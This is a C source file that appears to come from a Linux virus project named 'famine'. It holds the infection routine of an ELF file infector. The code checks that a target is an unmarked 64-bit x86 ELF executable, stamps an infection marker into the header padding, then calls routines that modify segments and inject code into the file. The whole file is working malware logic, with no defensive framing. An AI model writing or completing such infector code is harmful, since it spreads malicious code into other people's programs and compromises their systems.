#include <famine.h>

////////////////////////////////////////////////////////////////////////////////
/// STATIC FUNCTIONS
////////////////////////////////////////////////////////////////////////////////

static inline Elf64_Ehdr *get_header(struct elf *file)
{
	Elf64_Ehdr *header;
	
	header = (Elf64_Ehdr *)file->ptr;

	if (file->ptr + sizeof(Elf64_Ehdr) >= file->ptr + file->size)
		return NULL;

	return header;
}

static inline bool is_elf(const Elf64_Ehdr *header)
{
	return *(unsigned int *)header == ELF_MAGIC_NUMBER;
}

static inline bool is_x86(const Elf64_Ehdr *header)
{
	return header->e_ident[EI_CLASS] == X86_64;
}

static inline bool is_linked(const Elf64_Ehdr *header)
{
	return header->e_entry != 0;
}

static inline bool is_not_infected(const Elf64_Ehdr *header)
{
	return *(uint32_t *)((char *)&header->e_ident[EI_PAD]) != INFECTED_MAGIC_NUMBER;
}

////////////////////////////////////////////////////////////////////////////////
/// PUBLIC FUNCTION
////////////////////////////////////////////////////////////////////////////////

void infect_file(const char *filename)
{
	struct elf file;
	Elf64_Ehdr *header;
	const struct criteria sm[] =
	{
		(const struct criteria){&is_elf},
		(const struct criteria){&is_x86},
		(const struct criteria){&is_linked},
		(const struct criteria){&is_not_infected},
	};
	const unsigned char limit = sizeof(sm) / sizeof(sm[0]);

	if ((file = get_file(filename)).size == 0)
		return ;

	if ((header = get_header(&file)) == NULL)
		return ;

	for (register unsigned char index = 0; index < limit; index++)
	{
		if (sm[index].f(header) == false)
			return ;
	}

	printf("\"%s\" is infectable\n\n", filename);  // DEBUG
	*(unsigned int*)&header->e_ident[EI_PAD] = INFECTED_MAGIC_NUMBER;

	modify_segments(&file);
	inject(&file, filename);

	_munmap(file.ptr, file.size);
}
